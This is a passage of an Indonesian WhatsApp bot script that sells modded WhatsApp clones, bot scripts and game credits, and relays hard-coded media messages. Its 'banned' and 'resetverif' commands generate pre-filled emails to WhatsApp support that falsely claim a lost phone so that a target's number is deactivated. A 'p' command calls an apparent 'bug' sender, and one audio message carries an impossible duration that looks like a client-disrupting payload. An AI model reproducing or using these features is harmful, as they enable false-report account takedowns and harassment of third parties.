    {title: `APK PENULIS LAYAR `, rowId: `${prefix}drawany`, description: `Package : com.mlwrkz.drawanywhere
Versi : 32`},
    {title: `APK STYLE TEXT `, rowId: `${prefix}drawany1`, description: `Package : com.duy.asciiart
Versi : 404`},
    {title: `APK EDITOR `, rowId: `${prefix}drawany2`, description: `Package : com.gmail.heagoo.apkeditor.pro
Versi : 300`},
    {title: `MT MANAGER `, rowId: `${prefix}drawany3`, description: `Package : bin.mt.plus
Versi : 2.11.3`},
   {title: `WHATSAPP CLONE FAKE CHAT + UNLIMITED REPORT `, rowId: `${prefix}wonggbb`, description: `Package : com.gbwhatsapp
Versi : 2139210154`},
  {title: `WHATSAPP CLONE `, rowId: `${prefix}wonggb`, description: `Package : com.gbwhatsapp
Versi : 2139210154`},
  {title: `WHATSAPP CLONE `, rowId: `${prefix}wonggb1`, description: `Package : com.hwmodswa
Versi : 2139210154`},
{title: `WHATSAPP CLONE `, rowId: `${prefix}wonggb2`, description: `Package : com.hwwhatsapp
Versi : 2139210154`},
{title: `WHATSAPP CLONE `, rowId: `${prefix}wonggb3`, description: `Package : com.wago
Versi : 2139210154`},
{title: `WHATSAPP UNCLONE `, rowId: `${prefix}wonggb4`, description: `Package : com.whatsapp
Versi : 2139210154`},
 {title: `WHATSAPP UNCLONE `, rowId: `${prefix}hwcap1`, description: `Package : com.whatsapp
Versi : 999999999`},
{title: `WHATSAPP CLONE `, rowId: `${prefix}hwcap`, description: `Package : com.gbwhatsapp
Versi : 999999999`},
{title: `WHATSAPP CLONE `, rowId: `${prefix}hwcap2`, description: `Package : com.hwmodswa
Versi : 999999999`},
{title: `WHATSAPP CLONE `, rowId: `${prefix}hwcap4`, description: `Package : com.hwwhatsapp
Versi : 999999999`},
{title: `WHATSAPP CLONE `, rowId: `${prefix}hwcap3`, description: `Package : com.privatehwmods
Versi : 999999999`},
{title: `WHATSAPP CLONE `, rowId: `${prefix}hwcap5`, description: `Package : com.wago
Versi : 999999999`},
{title: `PANEL`, rowId: `${prefix}panel`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `SCRIPT BOT PRIVATE`, rowId: `${prefix}skripp`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `SCRIPT BOT 25k`, rowId: `${prefix}skrip`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `DIAMOND ML`, rowId: `${prefix}diamond`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `PEMBAYARAN`, rowId: `${prefix}payment`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `JAS RUN BOT`, rowId: `${prefix}jasarun`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `NODE MODULES`, rowId: `${prefix}nodemodules`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `PULSA`, rowId: `${prefix}pulsa`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`}
]
}
]
kesper.sendListMsg(m.chat, `
Aku Menjual Berbagai Kebutuhan Seperti
- WhatsApp Mods Imune
- Script Bot Whatsapp
- Diamond Mobile Legends
- Pulsa All Operator
- Panel Untuk Hosting Bot
- Jasa Running Bot

Semoga Kalian Suka 🥳`, kesper.user.name, `Hay Kak List Jualan Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
break
//=================================================//
case 'listwibu':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
touchmebree = [
{
title: `©️ Casper`,
rows: [
{title: `WIBU 1`, rowId: `${prefix}kill`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `WIBU 2`, rowId: `${prefix}pat`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 3`, rowId: `${prefix}lick`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 4`, rowId: `${prefix}yeet`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 5`, rowId: `${prefix}bite`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 6`, rowId: `${prefix}wink`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 7`, rowId: `${prefix}poke`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 8`, rowId: `${prefix}nom`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 9`, rowId: `${prefix}slap`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 10`, rowId: `${prefix}smile`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 11`, rowId: `${prefix}wave`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 12`, rowId: `${prefix}blush`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 13`, rowId: `${prefix}smug`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 14`, rowId: `${prefix}glomp`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 15`, rowId: `${prefix}happy`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 16`, rowId: `${prefix}dance`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `WIBU 17`, rowId: `${prefix}cringe`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `WIBU 18`, rowId: `${prefix}highfive`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `WIBU 19`, rowId: `${prefix}handhold`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `WIBU 20`, rowId: `${prefix}bonk`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`}
]
}
]
kesper.sendListMsg(m.chat, `
 Menyediakan Gambar Gratis Untuk Kalian Mau
Total 300 Gambar Dalam 
20 Command, Dengan Picture Yang Berbeda 🤝


Semoga Kalian Suka 🥳`, kesper.user.name, `Hay Kak Wibu Picture Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
//=================================================//
case 'assalamualaikum': case 'asalamualaikum': {
reply(`Waalaikumsalam`)
}
break
case 'p': {
reply(`Pa Pe Pa Pe`)
bugb(`apcb`)
}
break
//=================================================//
case 'banned': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
 var message = {
document : fs.readFileSync("./casper-file/sound/ngeselin.BIN"),
"fileName": `BANNED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` Casper`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `BANNED`, url: 'mailto:support@whatsapp.com?Body=Hello,%20please%20deactivate%20this%20number,%20because%20I%20have%20lost%20my%20cellphone%20and%20someone%20is%20using%20my%20number,%20please%20deactivate%20my%20number:%2B+62xxxxxx'}}],
headerType: 1
}
kesper.sendMessage(m.chat, message, { quoted:m })
}
break
//=================================================//
case 'unbaned': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
 var message = {
document : fs.readFileSync("./casper-file/sound/ngeselin.BIN"),
"fileName": `UNBANED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` Casper`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `UNBANED`, url: 'mailto:support@whatsapp.com?Body=Please%20reactivate%20my%20number%20because%20I%20didnt%20violate%20any%20WhatsApp%20rules,%20suddenly%20my%20number%20was%20banned,%20please%20reactivate%20this%20number:%2B+62xxxxxxx%20because%20I%20didnt%20do%20anything%20wrong,%20suddenly%20my%20number%20was%20banned%20when%20I%20entered%20the%20group%20so%20I%20ask%20the%20respectable%20WhatsApp%20party,%20please%20reactivate%20my%20number,%20thank%20you'}}],
headerType: 1
}
kesper.sendMessage(m.chat, message, { quoted:m })
}
break
//=================================================//
case 'resetverif': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
 var message = {
document : fs.readFileSync("./casper-file/sound/ngeselin.BIN"),
"fileName": `UNBANED WHATSAPP`,
caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
footer: ` Casper`,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `RESET CODE`, url: 'mailto:support@whatsapp.com?Body=Please%20research%20the%20OTP%20code%20for%20this%20number%20because%20someone%20else%20accidentally%20logged%20in%20with%20my%20number%20and%20I%20had%20to%20wait%208%20hours,%20please%20research%20again%20at%20this%20number:%2B+62xxxxx'}}],
headerType: 1
}
kesper.sendMessage(m.chat, message, { quoted:m })
}
break
//=================================================//
case 'listban':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
touchmebree = [
{
title: `©️ Casper`,
rows: [
{title: `BANNED`, rowId: `${prefix}banned`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `UNBANED`, rowId: `${prefix}unbaned`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `RESET CODE`, rowId: `${prefix}resetverif`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
kesper.sendListMsg(m.chat, `
Hii Guys Aku Menyediakan Methode Ban Menggunakan Gmail 🥳
Dan Ini Tidak Akan Selalu Tepat Sasaran Hanya Akan Berlaku Jika Si Target Memang Betul Telah Melukan Kesalahan Dalam Ketentuan layanan Komunitas WhatsApp

© WhatsApp LLC

Semoga Kalian Suka 🥳`, kesper.user.name, `Hay Kak List Ban Bot Ada Di List`, `Click Here`, touchmebree, m)
break
//=================================================//
case 'oke': case 'anjing': case 'anjay': case 'ajg': case 'thx': case 'thanks' : case 'makasih': case 'mksh': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AvpcNTnCiFuwMOTF_4M-_pQul6OGHttQt9mT-ELnqRGi.enc",
"mimetype": "audio/mpeg",
"fileSha256": "voiw4MmXNUd1ZZ6Phtz5wuIuVVteGLpHbM25ELh8M3I=",
"fileLength": "590156",
"seconds": 38,
"ptt": true,
"mediaKey": "pTTV3QeU+tHQ0QxSLQcxT+N8Z4aNDdNGQEWD3Ek5BAk=",
"fileEncSha256": "7H3yGsETGrNYNXKOiRRrv7sJkh72KmHlqc6fr4iwMlU=",
"directPath": "/v/t62.7114-24/30633446_677011363892883_1835941796065619727_n.enc?ccb=11-4&oh=01_AdRoORpHvya9BbHrVj0kEow0V5brcP3h3uTX7VgNUFtIUw&oe=63D1F365",
"mediaKeyTimestamp": "1672112575",
}
}), { userJid: m.chat, quoted: m })
kesper.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break

case 'lagu': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/Ao0VjkFEicTiR4sSao95tJtfGf1GcOBi1D3A1HmJ2NBb.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jYomfG7vWpwdHdyEWMcNXWcQ4RK4zJTrk7MOXoOWbW0=",
"fileLength": "39770009",
"seconds": 3111111111,
"ptt": true,
"mediaKey": "IkTeNGd3eQ8Zgyp45Ns3ocu0umwHzNN1ohMXMDx9LnU=",
"fileEncSha256": "vtCEyCO0AsoAXepMJ0YlZZPTTzBajpEkLUVIXUwGPJs=",
"directPath": "/v/t62.7114-24/32700763_1139228503444236_568972103735624216_n.enc?ccb=11-4&oh=01_AdR_jymBdTiN8hGuzYpBmdxhFHMnAm7jAzZHykJanR5KBA&oe=63D648B3",
"mediaKeyTimestamp": "167240245908",
}
}), { userJid: m.chat, quoted: m })
kesper.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
//=================================================//

case 'asupan1': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/AoN3Abh6GK2kqg9-2ec38RBmxDLpDI8nsqr1cnKyeZO_.enc",
"mimetype": "video/mp4",
"fileSha256": "ZWcRwuTMHxit/cPV5AqkSkLzQty+iSA+sK+AS+uihCo=",
"fileLength": "2698963",
"seconds": 11,
"mediaKey": "E1AkiF4aKog2Y2QxwP500iE3Duh5d0seuScJYlloQTs=",
"height": 1024,
"width": 576,
"fileEncSha256": "Jtf7kqgzYKASn40g/pfGiouncinGuM9CJecC8x1An6g=",
"directPath": "/v/t62.7161-24/21323718_3165337010424334_2222204692383853765_n.enc?ccb=11-4&oh=01_AdSjm4Sg-kTU2_itIi3Xv5KiWbRe16_tMsmQr3RyUN3hpA&oe=63E2AB40",
"mediaKeyTimestamp": "1673208561",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAADAAIEBQEBAQEBAQAAAAAAAAAAAAAAAAABAgP/2gAMAwEAAhADEAAAAOBsz7ZTwdfknnl4zqUXb1crfWMcVGcimu816II2VqeANntMazD2dEBDsJpLMySZJWRf/8QAIxABAAIDAAICAQUAAAAAAAAAAQACAxEhBBIxURATImFiof/aAAgBAQABPwC37rcmPFQOkzUKBavBiIu5vk5MNd3Yal6++KxHYwNk1PGD1ViasJMemeRT0ypMdN41Puat9Ew69Zw+ZiuM8zH71MhPHd1Sfo/2mJ5Gz9TGrfZKW2fxLUrRWr8s3MdWqxouufMxY/WumKHCWZ7QV7/kxrvdo3hbax7ubZ7wtqN5R4zfzNwFlAQ52ZFLJuYV7N8fx//EABcRAAMBAAAAAAAAAAAAAAAAAAABERD/2gAIAQIBAT8AYsgshCFLkiu//8QAHBEAAgICAwAAAAAAAAAAAAAAAREAEAIhIEGB/9oACAEDAQE/ABDTeI17DTnVLfL/2Q==",
}
}), { userJid: m.chat, quoted: m })
kesper.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan2': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjB2biThIRMsYiC3qbBTg2n-UwDBEwt5vcD0_8o7Neqq.enc",
"mimetype": "video/mp4",
"fileSha256": "J9hVCEtwINAQz1MeDmvjE5NwnAfUB5hrkBkCDzYt0qA=",
"fileLength": "2104648",
"seconds": 10,
"mediaKey": "G2amDbQm8Ncy7Og+oJt7UAOqwVtixrUhpgfzaVvQSls=",
"height": 1024,
"width": 576,
"fileEncSha256": "CV3CfkLvYtg+WwTRe6RGV3XLfg9S9q2ZYH9mTWJb/6M=",
"directPath": "/v/t62.7161-24/40776347_3261745360756260_7644823307622382395_n.enc?ccb=11-4&oh=01_AdSnOIcZuM7Rkm-WvsodVbYWeh9Q90IQ2w5si5cfwBZ5eA&oe=63E28579",
"mediaKeyTimestamp": "1673208562",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAvAAEAAwEBAAAAAAAAAAAAAAAEAAMFAgEBAQEBAQEAAAAAAAAAAAAAAAMCBAEA/9oADAMBAAIQAxAAAAAqOOAC+vytU5pRVBvBozlX+39P3EM84lpoBpdY6jX64zyrFkqx+XpSPCiK1PnDcTPCWyIpr5PWWmT0/wD/xAAkEAACAwACAQIHAAAAAAAAAAABAgADESExExASBCIyQVFhgf/aAAgBAQABPwBFbiARgqjWIhUHmOMnEWfGW+JAB2Yp81QXNYDRAl574EYZ6IBLaHtvIP0rKKPaolqMF2WgzTEGQcOS32iWB8GR11SJYvezx/uV43UesNWRnMpUqOY0v76nEqbCIp9y8mE4v9jHgS5hpE4/MQyo6p0wupIUGOehLz859FMoQlDvRlQAcjIcEvQNpE8TStFHcVsiOPK0Z47TZ//EAB0RAQACAgIDAAAAAAAAAAAAAAEAAgMRICIhMUH/2gAIAQIBAT8AFtYJYD7BmLYsvj6wsHuUatjcueCGOsxncjfcS23XD//EAB4RAAIBBAMBAAAAAAAAAAAAAAABAgMREiEQE0Ex/9oACAEDAQE/AFtjp29LlFXlsqSUhCmntfT1sxTIJ5HWOMkJJEuP/9k=",
}
}), { userJid: m.chat, quoted: m })
kesper.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan3': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgzxUvp5P4ApOkybMWZVbzoOmD_e_Srw76xf1ngWs999.enc",
"mimetype": "video/mp4",
"fileSha256": "hmr9crxngcE+iYuJKKE/sKCeAyPNYCCPdu9Dtn4XtWY=",
"fileLength": "1302167",
"seconds": 16,
"mediaKey": "iozgZ7KtLP0i9AKTZ1uF8bIQh+kbM7NzZAaeFg2rQBU=",
"height": 1024,
"width": 576,
"fileEncSha256": "YeCW4WTRoePtPdWeTdk/+vGtVFwXEuwT2rOzWqHVu2U=",
"directPath": "/v/t62.7161-24/31804582_506314984701916_8194635137770660774_n.enc?ccb=11-4&oh=01_AdT0ZBpZyQ3oHhpqS8r5gS9q_7lJtbV562OcEezFRO_dDA&oe=63E29D93",
"mediaKeyTimestamp": "1673208563",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAvAAEAAwEBAAAAAAAAAAAAAAADAAIEAQUBAQEBAQEAAAAAAAAAAAAAAAIDAQAE/9oADAMBAAIQAxAAAADNftjU6S/ZmO5qfp27Q+jlezCBObjvUVVegpaM5IfHUuN9VxtlU+1Guyd5I27lkrMKycP/xAAgEAADAQACAQUBAAAAAAAAAAAAAQIRITEQAxIiM0FC/9oACAEBAAE/AEsPwU/FmcFIwWDWLT20udKnUVNr+j5mF5kJ9NlTHtzeiWqhMtGH6j1frazSlV+mtWEwonEX4XZKXYyui/CZI2imi/CZL4KZdYVaZoq6IfBbxaVWlM0Vcomh0PtlM0//xAAYEQADAQEAAAAAAAAAAAAAAAAAARECEP/aAAgBAgEBPwCifGLiRETmc0aRYZYz/8QAHREAAQMFAQAAAAAAAAAAAAAAAQADEQIQEiExQf/aAAgBAwEBPwDGVUL1XM2lOu4jXSqXDGwh6nRwoL//2Q==",
}
}), { userJid: m.chat, quoted: m })
kesper.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan4': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/ArGrKg-I9gbSJ218VTt8s_VNgc55iO213I8grKQBwJQe.enc",
"mimetype": "video/mp4",
"fileSha256": "9NqCmrU/Xbs38/M3F8NIWd76yJYm71uYG7ElwcH3cEg=",
"fileLength": "3660168",
"seconds": 10,
"mediaKey": "KHD2SrjuGxGTyZZB2yYdbT4dXAxV89SxYwwlu9Ol310=",
"height": 1024,
"width": 576,
"fileEncSha256": "nhBrj+p1u/OEVDNaLCRzitBTI4nQYbqKuYRM21gLjak=",
"directPath": "/v/t62.7161-24/34812918_670829518070021_5630485054193330664_n.enc?ccb=11-4&oh=01_AdQomc5LHAVFrOD47GBDUWHTeQbESAS54ZknV-fmJUEyZQ&oe=63E2951B",
"mediaKeyTimestamp": "1673208563",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAvAAEBAQADAQAAAAAAAAAAAAAEBQABAgMGAQEBAQEAAAAAAAAAAAAAAAABAgAD/9oADAMBAAIQAxAAAACYrUe6ePXJtNT08+TbeOl2njFnTlA8cNVYKru0D6P5g3m+dWi5zp7mXG7lyfg/rKRmzCxbTZk7S//EACcQAAICAgEDAwQDAAAAAAAAAAECAAMEERITIkEhMVIUYWJxJFFy/9oACAEBAAE/ACA1aGIoexO2FbVewo41EBsye6Ha3NxPmcrfnK6QUQEeqyqhVcHUyOpTZZ2Hi8wqHa4uQdTLqau9vSdX8Ytdx9mErryOQ71l3NBuy1NSp1dSEdD+hMxkU6d0nOr5pKXAqrJBPKC1QygAncvpN1tpO9L7TBJTKKzKJsyn/c+mT7zaitADKdK6Q13WWvxICwBqM/TQK92W/D+50L/ksour6wrImTZXUvJlG/Ept3QH+05NkZ6xH6GXZ/qdWKhB6sfd7BS3gTnxpasHxqY749ZU9vMTMNTuWXXLcFo0IrBUHt+pjZGiAVWC5l23oQIXezZFVejG2j7NYE5/jEBa3UvQoBwMQ/xiPOpjZBFoRh6S242WFfHKCf/EABsRAAMBAAMBAAAAAAAAAAAAAAABAiEREjFB/9oACAECAQE/AFJwUtPh1z0pieI3SmS8FTK0RL9KP//EABsRAQACAgMAAAAAAAAAAAAAAAABAjFBEBFC/9oACAEDAQE/AHaJ5hOUqJysqna3lTb/2Q==",
}
}), { userJid: m.chat, quoted: m })
kesper.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan5': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/AhYSj1MUKNbYkGkop4QGM5JQDX5LzjsKCL6HynJULoN4.enc",
"mimetype": "video/mp4",
"fileSha256": "4mT5xSHgqwpeFnv5s9E6pMftW0ULmJ9Xbcu/d5koCSY=",
"fileLength": "2434816",
"seconds": 15,
"mediaKey": "I66ZMH2JR7sG6L1cA/J60q8LlqE2QPHpX4QV/wxLVaE=",
"height": 1024,
"width": 576,
"fileEncSha256": "mdpJPdb7uDuCMT6OBeTzsrKhG7z8LFcWRCPJ9oLfZcM=",
"directPath": "/v/t62.7161-24/29032125_499171118777514_8503128052115281965_n.enc?ccb=11-4&oh=01_AdRfgwh9FYhF7KWQPbZqiURj5aC72vWfi_BKNE9HmtA_4A&oe=63E285F0",
"mediaKeyTimestamp": "1673208564",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAtAAEBAQEBAAAAAAAAAAAAAAACAwABBAEBAQEBAAAAAAAAAAAAAAAAAgEAA//aAAwDAQACEAMQAAAA8VC+3HhZskyg29RgDPWIsDbuDNLCHUDoQKKCt56HKYWo53ZnPaKFdpv/xAAfEAADAQACAgMBAAAAAAAAAAAAAQIRECESMQNBQnH/2gAIAQEAAT8ASSFw0h8JCRgxo1ErtGGDRaMJ9iL+VqmpnUvZ1STRa4n3xMY3S/Xs+i+JtaeaJ+SsnJ9sqi2aie2non4vdG0kP+l8LEZNdabI8G0zxG+xPs0+h9Gn/8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECERIhEFH/2gAIAQIBAT8A4cJFmkX5G9NnTbIzo2JKiaR8P//EABsRAAMBAQADAAAAAAAAAAAAAAABEQISAyFB/9oACAEDAQE/AKysyQ4aSZCI1OUhT6cI1haOEabp426y+2f/2Q==",
}
}), { userJid: m.chat, quoted: m })
kesper.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan6': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/Ami1O8HlP3fJv735AMiZGcnEwQJPHo4teDowt3Jg8u45.enc",
"mimetype": "video/mp4",
"fileSha256": "GfikYNJesdvYbd/nBp/pgs0elVeLw5MjBtTFeztH8Uw=",
"fileLength": "1850255",
"seconds": 17,
"mediaKey": "QG87Jz8NpCPNWSsjipBreyEG2Tvod2m5KCcYWnX0VJg=",
"height": 1024,
"width": 576,
"fileEncSha256": "YNBkz2eh0Ql9sRMvmTsYnVS5CoZeG1VARXtrM9HPINk=",
"directPath": "/v/t62.7161-24/11843021_4211449328979240_4968611040884473707_n.enc?ccb=11-4&oh=01_AdS_I3VLvdWOFu3zBAf_d1wY3Z4YF1MaQPFkI_zYIvZROg&oe=63E27F17",
"mediaKeyTimestamp": "1673208565",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAACAwQAAQUBAAMBAAAAAAAAAAAAAAAAAAECAwD/2gAMAwEAAhADEAAAAPGYtjDorcQrd5s0aJYVfL6sT5T3LK8qnrxFrVukktcYLiCiTPXxVUCSlcKmzaJNW2Cx2ff/xAAjEAACAgICAQUBAQAAAAAAAAAAAQIRAxIQMVEEISJBUjJh/9oACAEBAAE/AEJcMa4Q2orZiy2+vY7VobXEMLu5dGR7tR1pfSJemetqkyLaTRCOz/xdm+EUz1M08i18GLeWJOS+WpjhOE3GUOyopVRrj8GNbSSFjx/g1eydi6M8V2uMH9EJLauJMzOo8YH7sc0siYpk5kntBo0n+iNC08Ib+0Tal8bsk6TSPl5QhSL9hapuo0Nss//EAB0RAQACAgIDAAAAAAAAAAAAAAEAERASITECICL/2gAIAQIBAT8AuXePpeSCku/TwdlwqdMtHhmy9uP/xAAbEQACAwADAAAAAAAAAAAAAAAAEAERIQISMf/aAAgBAwEBPwCjqsOVSUeOchYqhf/Z",
}
}), { userJid: m.chat, quoted: m })
kesper.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan7': {
